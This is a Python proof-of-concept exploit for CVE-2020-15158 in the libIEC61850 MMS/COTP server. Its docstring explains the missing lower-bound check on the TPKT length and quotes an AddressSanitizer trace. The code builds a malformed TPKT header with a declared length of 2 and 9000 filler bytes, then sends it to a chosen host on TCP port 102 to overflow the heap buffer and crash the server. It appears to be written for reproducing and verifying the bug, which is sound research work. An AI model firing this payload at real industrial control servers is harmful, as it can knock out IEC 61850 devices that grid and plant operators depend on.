#!/usr/bin/env python3
"""
CVE-2020-15158 PoC - libIEC61850 < 1.4.3 COTP/TPKT integer underflow ->
heap-buffer-overflow in src/mms/iso_cotp/cotp.c.

This targets the REAL upstream server_example_basic_io over its native
TCP/102 ISO-COTP/MMS listener -- the bytes below are a genuine TPKT(RFC1006)
frame, no harness framing. VERIFIED to abort the v1.4.0 (tag 6f7df75) server
under -fsanitize=address with an observable AddressSanitizer
heap-buffer-overflow and container exit code 1.

ROOT CAUSE (cotp.c, CotpConnection_readToTpktBuffer ~line 676):
  After reading the 4-byte TPKT header:
      self->packetSize = (buffer[2] * 0x100) + buffer[3];   // declared TPKT length
  the code checks ONLY the UPPER bound:
      if (self->packetSize > bufferSize) goto exit_error;    // never `< 4`
  The missing lower-bound (`packetSize < 4`) check IS the CVE; 1.4.3
  (commit 033ab5b) added it. With bufPos already == 4, the body then does:
      readBytes = readFromSocket(self, buffer + bufPos, self->packetSize - bufPos);
  If the declared TPKT length is < 4 (here 2), `packetSize - bufPos` = 2 - 4 = -2.
  That negative int is passed as `size` to Socket_read -> recv(fd, buf+4,
  (size_t)-2, ...). The size_t wraps to ~2^64, so recv is free to copy as many
  bytes as the peer queued into the fixed 8196-byte cotpReadBuffer.

TRIGGER: declare TPKT length = 2 (< 4), then immediately queue MORE than
8192 trailing bytes on the same socket. recv copies them straight past the
end of the 8196-byte heap buffer.

VERIFIED ASan trace (container logs):
  ==1==ERROR: AddressSanitizer: heap-buffer-overflow ... WRITE of size 9000
    #0 __interceptor_recv
    #1 Socket_read                      hal/socket/linux/socket_linux.c:548
    #2 readFromSocket                   src/mms/iso_cotp/cotp.c:671
    #3 CotpConnection_readToTpktBuffer  src/mms/iso_cotp/cotp.c:721   <-- the CVE
    #4 IsoConnection_handleTcpConnection src/mms/iso_server/iso_connection.c:149
  "0 bytes to the right of 8196-byte region" (the cotpReadBuffer).

No prior COTP CONNECT-REQUEST handshake is needed: the overflow happens in the
TPKT read layer, before parseCotpMessage / the COTP state machine is reached.
A single fresh TCP connection carrying one malformed TPKT header (plus filler)
is sufficient. The server is single-process, so this one frame kills it.

Usage: python3 mms_cve_2020_15158_real_poc.py [host] [port]
"""
import socket
import sys
import time

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 102

# TPKT header with a length field of 2 (< 4) -> packetSize=2 -> negative recv
# size in readToTpktBuffer. The filler must exceed the 8192-byte usable region
# of the 8196-byte cotpReadBuffer so recv overruns it. 9000 bytes is comfortable.
FILLER_LEN = 9000
TPKT_HEADER_LEN_LT_4 = 2  # buffer[2]*0x100 + buffer[3] = 0x0002


def build_frame() -> bytes:
    hdr = bytes(
        [0x03, 0x00, (TPKT_HEADER_LEN_LT_4 >> 8) & 0xFF, TPKT_HEADER_LEN_LT_4 & 0xFF]
    )
    return hdr + (b"A" * FILLER_LEN)


def main() -> int:
    frame = build_frame()
    print(
        f"[*] CVE-2020-15158: TPKT len={TPKT_HEADER_LEN_LT_4} (<4) + {FILLER_LEN}B filler "
        f"-> negative recv size overruns 8196B cotpReadBuffer"
    )
    print(f"[*] header hex: {frame[:4].hex()}  total frame: {len(frame)} B")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        s.sendall(frame)
        try:
            data = s.recv(64)
            print(f"[*] recv: {data!r} (empty/RST => server aborted)")
        except Exception as e:
            print(f"[*] recv: {e} (likely server aborted)")
        s.close()
    except Exception as e:
        print(f"[!] connection error: {e}")
        return 1

    time.sleep(0.3)
    print("[*] sent. Expect AddressSanitizer heap-buffer-overflow in")
    print("    CotpConnection_readToTpktBuffer (src/mms/iso_cotp/cotp.c:721) and a")
    print("    container exit code != 0.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
